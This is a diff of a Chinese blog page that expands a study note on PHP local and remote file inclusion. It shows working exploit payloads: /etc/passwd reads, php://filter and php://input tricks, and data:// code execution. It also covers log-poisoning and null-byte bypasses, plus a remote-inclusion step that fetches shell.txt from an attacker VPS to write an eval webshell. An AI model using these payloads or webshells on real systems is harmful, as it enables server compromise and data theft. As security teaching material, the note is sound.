@@ -401,14 +401,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    994
+                    2.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    10 分
                 </div>
                 
 
@@ -452,8 +452,7 @@
 <blockquote>
 <p>（1）include()等函数通过动态变量的方式引入包含文件； （2）用户能够控制该动态变量。</p>
 </blockquote>
-<p><strong>1、读取敏感文件</strong></p>
-<pre class=" language-bash"><code class="language-bash">?arg<span class="token operator">=</span>/etc/passwd
+<h3 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a><strong>1、读取敏感文件</strong></h3><pre class=" language-bash"><code class="language-bash">?arg<span class="token operator">=</span>/etc/passwd
 </code></pre>
 <h3 id="2、利用封装协议读源码"><a href="#2、利用封装协议读源码" class="headerlink" title="2、利用封装协议读源码"></a><strong>2、利用封装协议读源码</strong></h3><pre class=" language-bash"><code class="language-bash">?arg<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>config.php	<span class="token comment" spellcheck="true">#这样能看到php文件的源码</span>
 </code></pre>
@@ -469,6 +468,147 @@ or
 convert.iconv.<span class="token operator">&lt;</span>input-encoding<span class="token operator">></span>/<span class="token operator">&lt;</span>output-encoding<span class="token operator">></span>
 </code></pre>
 <h3 id="3、包含图片Getshell"><a href="#3、包含图片Getshell" class="headerlink" title="3、包含图片Getshell"></a><strong>3、包含图片Getshell</strong></h3><p>在上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码</p>
+<h3 id="4、截断包含"><a href="#4、截断包含" class="headerlink" title="4、截断包含"></a><strong>4、截断包含</strong></h3><p>漏洞代码：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span>index<span class="token punctuation">.</span>php<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>这样做一定程度上修复了漏洞， 上传<strong>图片一句话</strong>并访问：<code>http://vuln.com/index.php?arg=1.jpg</code>会出错。</p>
+<p>因为包含文件里面不存在<code>1.jpg.php</code>这个文件。</p>
+<p>但是如果输入<code>http://vuln.com/index.php?arg=1.jpg%00</code>，就极有可能会绕过检测。</p>
+<p>这种方法只适用于<code>php.ini</code>中<code>magic_quotes_qpc=off</code>并且<code>PHP</code>版本&lt; 5.3.4的情况。</p>
+<p>如果为on，%00会被转义，以至于无法截断。</p>
+<h3 id="5、包含Apache日志Getshell"><a href="#5、包含Apache日志Getshell" class="headerlink" title="5、包含Apache日志Getshell"></a><strong>5、包含Apache日志Getshell</strong></h3><blockquote>
+<p><strong>条件：</strong>知道日志文件access.log的存放位置 ，默认位置：<code>/var/log/httpd/access_log</code></p>
+</blockquote>
+<p><code>access.log</code>文件记录了客户端每次请求的相关信息； 当我们访问一个不存在的资源时<code>access.log</code>文件仍然会记录这条资源信息。</p>
+<p>如果目标网站存在文件包含漏洞，但是没有可以包含的文件时，</p>
+<p>我们就可以尝试访问<code>http://www.vuln.com/&lt;?php phpinfo(); ?&gt;</code></p>
+<p>Apache会将这条信息记录在access.log文件中，这时如果我们访问access.log文件，就会触发文件包含漏洞。</p>
+<p>理论上是这样的，但是实际上却是输入的代码被转义无法解析。</p>
+<p>攻击者可以通过burpsuite进行抓包在http请求包里面将转义的代码改为正常的测试代码就可以绕过。</p>
+<p>这时再查看Apache日志文件，显示的就是正常的测试代码。</p>
+<p>这时访问：<code>http://www.vuln.com/index.php?arg=/var/log/httpd/access_log</code>，即可成功执行代码</p>
+<h2 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h2><p>这个过滤器需要php支持 iconv ，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。</p>
+<p>iconv — 字符串按要求的字符编码来转换</p>
+<p>convery.iconv.*的使用有两种方法:</p>
+<pre class=" language-bash"><code class="language-bash">convert.iconv.<span class="token operator">&lt;</span>input-encoding<span class="token operator">></span>.<span class="token operator">&lt;</span>output-encoding<span class="token operator">></span> 
+or 
+convert.iconv.<span class="token operator">&lt;</span>input-encoding<span class="token operator">></span>/<span class="token operator">&lt;</span>output-encoding<span class="token operator">></span>
+</code></pre>
+<p>支持的字符编码有一下几种（详细参考官方手册）</p>
+<pre class=" language-bash"><code class="language-bash">UCS-4*
+UCS-4BE
+UCS-4LE*
+UCS-2
+UCS-2BE
+UCS-2LE
+UTF-32*
+UTF-32BE*
+UTF-32LE*
+UTF-16*
+UTF-16BE*
+UTF-16LE*
+UTF-7
+UTF7-IMAP
+UTF-8*
+ASCII*
+</code></pre>
+<p>攻防世界里的文件包含题目就是用的convert.iconv.*</p>
+<h2 id="PHP中的封装协议-伪协议"><a href="#PHP中的封装协议-伪协议" class="headerlink" title="PHP中的封装协议(伪协议) #"></a>PHP中的封装协议(伪协议) <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/fileincludes.html#php%E4%B8%AD%E7%9A%84%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE-%E4%BC%AA%E5%8D%8F%E8%AE%AE">#</a></h2><p>以下协议未写明条件的即是allow_url_fopen和allow_url_include状态off&#x2F;on都行。</p>
+<h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F; #"></a>file:&#x2F;&#x2F; <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/fileincludes.html#file">#</a></h3><h4 id="作用："><a href="#作用：" class="headerlink" title="作用："></a><strong>作用：</strong></h4><p>用于访问本地文件系统，在CTF中通常用来读取本地文件,且不受allow_url_fopen与allow_url_include的影响。</p>
+<p><code>include()/require()/include_once()/require_once()</code>参数可控的情况下</p>
+<p>如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的</p>
+<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a><strong>示例：</strong></h4><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#1. file://[文件的绝对路径和文件名]</span>
+http://127.0.0.1/include.php?file<span class="token operator">=</span>file://C:\phpStudy\PHPTutorial\WWW\phpinfo.txt
+
+<span class="token comment" spellcheck="true">#2. file://[文件的相对路径和文件名]</span>
+http://127.0.0.1/include.php?file<span class="token operator">=</span>./phpinfo.txt
+
+<span class="token comment" spellcheck="true">#3. file://[网络路径和文件名]</span>
+http://127.0.0.1/include.php?file<span class="token operator">=</span>http://127.0.0.1/phpinfo.txt
+</code></pre>
+<h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F; #"></a>php:&#x2F;&#x2F; <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/fileincludes.html#php">#</a></h3><h4 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h4><pre class=" language-text"><code class="language-text">allow_url_fopen:off/on
+
+allow_url_include : 部分需要on (下面列出)
+
+php://input
+
+php://stdin
+
+php://memory 
+
+php://temp
+</code></pre>
+<h4 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a><strong>作用：</strong></h4><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是 <code>php://filter</code> 和 <code>php://input</code></p>
+<p>php:&#x2F;&#x2F;filter用于<strong>读取源码</strong>，php:&#x2F;&#x2F;input用于<strong>执行</strong>php代码</p>
+<h4 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a><strong>示例：</strong></h4><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#1. php://filter/read=convert.base64-encode/resource=[文件名]  //读取文件源码</span>
+http://127.0.0.1/include.php?file<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>phpinfo.php
+
+<span class="token comment" spellcheck="true">#2.php://input + [POST DATA]执行php代码</span>
+http://127.0.0.1/include.php?file<span class="token operator">=</span>php://input
+<span class="token punctuation">[</span>POST DATA部分<span class="token punctuation">]</span> <span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>
+
+<span class="token comment" spellcheck="true">#3.若有写入权限，[POST DATA部分] 写入一句话木马</span>
+<span class="token operator">&lt;</span>?php fputs<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token string">'shell.php'</span>,<span class="token string">'w'</span><span class="token punctuation">)</span>,<span class="token string">'&lt;?php @eval(<span class="token variable">$_GET</span>[cmd]); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>
+</code></pre>
+<h3 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; #"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/fileincludes.html#zip-bzip2-zlib">#</a></h3><h4 id="作用：-2"><a href="#作用：-2" class="headerlink" title="作用："></a><strong>作用：</strong></h4><p><code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件</p>
+<p>更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等</p>
+<h4 id="示例：-2"><a href="#示例：-2" class="headerlink" title="示例："></a><strong>示例：</strong></h4><pre class=" language-html"><code class="language-html">1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
+<span class="token comment" spellcheck="true">&lt;!--压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传--></span>
+http://127.0.0.1/include.php?file=zip://C:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
+
+2.compress.bzip2://file.bz2
+<span class="token comment" spellcheck="true">&lt;!--压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）--></span>
+http://127.0.0.1/include.php?file=compress.bzip2://C:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
+
+3.compress.zlib://file.gz 
+<span class="token comment" spellcheck="true">&lt;!--压缩 phpinfo.txt 为 phpinfo.gz--></span>
+http://127.0.0.1/include.php?file=compress.zlib://C:\phpStudy\PHPTutorial\WWW\phpinfo.gz
+</code></pre>
+<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F; #"></a>data:&#x2F;&#x2F; <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/fileincludes.html#data">#</a></h3><h4 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a><strong>条件：</strong></h4><p>allow_url_fopen:on</p>
+<p>allow_url_include :on</p>
+<h4 id="作用：-3"><a href="#作用：-3" class="headerlink" title="作用："></a><strong>作用：</strong></h4><p>自<code>PHP&gt;=5.2.0</code>起，可以使用 <code>data://</code> 数据流封装器，以传递相应格式的数据。</p>
+<p>通常可以用来执行PHP代码</p>
+<h4 id="示例：-3"><a href="#示例：-3" class="headerlink" title="示例："></a><strong>示例：</strong></h4><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#1.data://text/plain,</span>
+http://127.0.0.1/include.php?file<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?php%20phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>
+
+<span class="token comment" spellcheck="true">#2.data://text/plain;base64,</span>
+http://127.0.0.1/include.php?file<span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre>
+<h3 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F; #"></a>phar:&#x2F;&#x2F; <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/fileincludes.html#phar">#</a></h3><p>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容</p>
+<pre class=" language-bash"><code class="language-bash">http://127.0.0.1/include.php?file<span class="token operator">=</span>phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
+</code></pre>
+<p><strong>利用条件 <code>PHP &gt; 5.3</code></strong></p>
+<p>要想使用Phar类里的方法，必须将<code>phar.readonly</code>配置项配置为0或Off</p>
+<p>利用 phar 协议可以拓展 php 反序列化漏洞攻击面</p>
+<h2 id="远程文件包含-RFL"><a href="#远程文件包含-RFL" class="headerlink" title="远程文件包含(RFL) #"></a>远程文件包含(RFL) <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/fileincludes.html#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-rfl">#</a></h2><p>服务器通过 PHP 的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，</p>
+<p>从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用 #"></a>漏洞利用 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/fileincludes.html#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2">#</a></h3><p><strong>条件：</strong><code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。</p>
+<p><strong>1、远程包含Webshell</strong></p>
+<pre class=" language-bash"><code class="language-bash">?arg<span class="token operator">=</span>http://攻击者的VPS/shell.txt
+<span class="token comment" spellcheck="true">#会在网站目录生成名为 shell.php 的一句话木马</span>
+</code></pre>
+<p><strong>shell.txt内容为：</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'./shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST[123]) ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计 #"></a>代码审计 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/fileincludes.html#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">#</a></h3><p><strong>文件包含用到的函数</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment" spellcheck="true">//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span>
+<span class="token function">inclue_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment" spellcheck="true">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span>
+
+<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment" spellcheck="true">//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment" spellcheck="true">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span>
+</code></pre>
+<p>代码审计的时候全局搜索以上函数</p>
+<p>如果是基于图像上传的 ，要搜<code>$_FILES</code> 变量， 因为PHP处理上传文件的功能，基本都与$_FILES有关。</p>
+<p>查看目录结构，重点关注includes、modules等文件夹，查看index.php等文件是否<strong>动态调用</strong>过这些内容，变量是否可控。</p>
 
                 
             </div>
@@ -914,6 +1054,14 @@ convert.iconv.<span class="token operator">&lt;</span>input-encoding<span class=
                     </div>
                 </div>
                 
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">笔记</span>
+                    </a>
+                    
+                </div>
+                
             </div>
         </div>
         
@@ -1148,7 +1296,7 @@ convert.iconv.<span class="token operator">&lt;</span>input-encoding<span class=
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">5.5k</span>
+                        class="white-color">7.8k</span>
             
             
             
